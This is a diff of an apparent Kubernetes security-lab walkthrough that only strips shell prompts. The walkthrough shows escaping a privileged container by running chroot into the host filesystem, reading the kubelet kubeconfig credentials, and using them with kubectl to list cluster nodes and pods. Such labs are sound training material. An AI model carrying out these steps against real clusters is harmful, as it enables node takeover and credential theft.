@@ -10,8 +10,8 @@
 Ensure to have the EKS Cluster including the Scenarios up and running:
 
 ```sh
-$ pgo --apply eks
-$ pgo --apply scenarios
+pgo --apply eks
+pgo --apply scenarios
 ```
 
 ## Attribution
@@ -67,23 +67,23 @@ You can recon the system, some interesting places to obtain the node level confi
 After performing the analysis, you can identify that this container has full privileges of the host system and allows privilege escalation. As well as `/host-system` is mounted.
 
 ```sh
-$ capsh --print
+capsh --print
 ```
 
 ```sh
-$ mount
+mount
 ```
 
 Now you can explore the mounted file system by navigating to the `/host-system` path
 
 ```sh
-$ ls /host-system/
+ls /host-system/
 ```
 
 You can gain access to the host system privileges using `chroot`.
 
 ```sh
-$ chroot /host-system bash
+chroot /host-system bash
 ```
 
 As you can see, now you can access all the host system resources like docker containers, configurations, etc.
@@ -91,7 +91,7 @@ As you can see, now you can access all the host system resources like docker con
 Trying to use the docker client fails.
 
 ```sh
-$ docker ps
+docker ps
 ```
 
 ```ascii
@@ -101,7 +101,7 @@ bash: docker: command not found
 This does not work, since we're on a Kubernetes optimized node OS with no docker provided.
 
 ```sh
-$ uname -a
+uname -a
 ```
 
 ```ascii
@@ -111,7 +111,7 @@ Linux system-monitor-6dfbdbb7d-w6mdv 5.10.184-175.749.amzn2.x86_64 #1 SMP Wed Ju
 The Kubernetes node configuration can be found at the default path, which is used by the node level kubelet to talk to the Kubernetes API Server. If you can use this configuration, you gain the same privileges as the Kubernetes node.
 
 ```sh
-$ cat /var/lib/kubelet/kubeconfig
+cat /var/lib/kubelet/kubeconfig
 ```
 
 ```ascii
@@ -145,7 +145,7 @@ users:
 Sadly, there is no `kubectl` as well.
 
 ```sh
-$ kubectl
+kubectl
 ```
 
 ```ascii
@@ -155,15 +155,15 @@ bash: kubectl: command not found
 Trying to use the package manager `yum` will not solve the problem. But navigating to https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux will help:
 
 ```sh
-$ cd
-$ curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
-$ chmod +x kubectl
+cd
+curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
+chmod +x kubectl
 ```
 
 Try to get the available nodes of our cluster:
 
 ```sh
-$ ./kubectl --kubeconfig /var/lib/kubelet/kubeconfig get nodes 
+./kubectl --kubeconfig /var/lib/kubelet/kubeconfig get nodes 
 ```
 
 ```ascii
@@ -175,7 +175,7 @@ ip-10-0-169-117.eu-central-1.compute.internal   Ready    <none>   56m   v1.25.11
 Can you do more?
 
 ```sh
-$ ./kubectl --kubeconfig /var/lib/kubelet/kubeconfig get pods -A
+./kubectl --kubeconfig /var/lib/kubelet/kubeconfig get pods -A
 ```
 
 ```ascii
@@ -206,7 +206,7 @@ victims             web-app-854bdf944f-ddqcs                           1/1     R
 ```
 
 ```sh
-$ ./kubectl --kubeconfig /var/lib/kubelet/kubeconfig get nodes 
+./kubectl --kubeconfig /var/lib/kubelet/kubeconfig get nodes 
 ```
 
 ```ascii
